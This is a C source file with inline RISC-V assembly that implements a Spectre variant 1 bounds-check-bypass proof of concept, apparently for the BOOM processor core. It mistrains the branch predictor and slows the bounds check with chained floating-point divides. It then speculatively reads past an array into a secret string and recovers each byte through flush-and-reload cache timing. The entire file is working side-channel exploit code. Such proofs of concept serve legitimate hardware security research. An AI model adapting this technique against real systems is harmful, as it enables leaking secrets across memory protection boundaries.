#include <stdio.h>
#include <stdint.h> 
#include "cache.h"
#include "encoding.h"
//#include "log.h"

#define TRAIN_TIMES 10 // assumption is that you have a 2 bit counter in the predictor
#define TRAIN_IDX 4 // idx used to train the attack function
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define SECRET_SZ 36

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "!\"#The Baby BOOMers are called Jabba";

// this should not count TRAIN_IDX as a valid idx since it gives a false positive
uint8_t minIdx(uint64_t* results, uint64_t sz){
    uint64_t minVal = ~0;
    uint64_t minIdxVal = 0;
    for (uint64_t i = 0; i < sz; ++i){
        if (i != array1[TRAIN_IDX]){
            if (minVal > results[i]){
                minVal = results[i];
                minIdxVal = i;
            }
        }
    }
    return minIdxVal;
}

void victimFunc(uint64_t idx){
    uint8_t dummy = 0;
    uint64_t two = 2;

    array1_sz =  array1_sz << 5;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (two)
        : "fa4", "fa5");

    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }

    dummy = rdcycle(); // bounds speculation here
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start;
    uint64_t passInIdx;
    uint64_t mixedIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];
    //printf("Array1 at (0x%p), Secret at (0x%p), Subtraction (%d)\n", array1, secretString, attackIdx);

    // try to read out the secret
    //for(uint64_t len = 0; len < SECRET_SZ; ++len){
    for(uint64_t len = 0; len < 3; ++len){
        // make sure array you read from is not in the cache
        flushCache((uint64_t)array2, sizeof(array2));

        for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
            // make sure the array1_sz is out of the cache
            //flushCache((uint64_t)&array1_sz, sizeof(array1_sz)); //techinically 8B
            dummy = rdcycle(); // flush the pipeline to make sure that the cache is actually flushed

            // bit twiddling to set passInIdx=TRAIN_IDX or to attackIdx after TRAIN_TIMES iterations
            // avoid jumps in case those tip off the branch predictor
            passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
            passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
            passInIdx = TRAIN_IDX ^ (passInIdx & (attackIdx ^ TRAIN_IDX)); // select TRAIN_IDX or attackIdx 

            asm("nop");
            asm("nop");

            // set of constant takens to make the BHR be in a all taken state
            for(uint64_t k = 0; k < 50; ++k){
                asm("nop");
                asm("nop");
                asm("nop");
                asm("nop");
            }

            // call function to train or attack
            victimFunc(passInIdx);
        }
        
        // read out array 2 and see the hit secret value
        // this is also assuming there is no prefetching
        //for (uint64_t i = '!'-3; i < '!'+3; ++i ){
        //    start = rdcycle();
        //    dummy &= array2[i * L1_BLOCK_SZ_BYTES];
        //    results[i] = rdcycle() - start;
        //    printf("time for idx(%d) = (%lu)\n", i, results[i]);
        //}
        for (uint64_t i = 0; i < 50; ++i){
            //mixedIdx = ((i * 167) + 13) & 255;
            start = rdcycle();
            //dummy &= array2[mixedIdx * L1_BLOCK_SZ_BYTES];
            //results[mixedIdx] = rdcycle() - start;
            dummy &= array2[i * L1_BLOCK_SZ_BYTES];
            results[i] = rdcycle() - start;
            printf("time for idx(%ld) = (%lu)\n", i, results[i]);
        }
        
        // Note: Could do this using a threshold value for a hit
        uint8_t secret = minIdx(results, 50);

        printf("m[0x%p] = want(%c) =?= decimal(%d) char(%c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], secret, secret); 
        //printf("m[0x%p] = want(%c) =?= decimal(%d) char(%c)\n", (uint8_t*)(array1 + attackIdx), secretString[0], secret, secret); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}
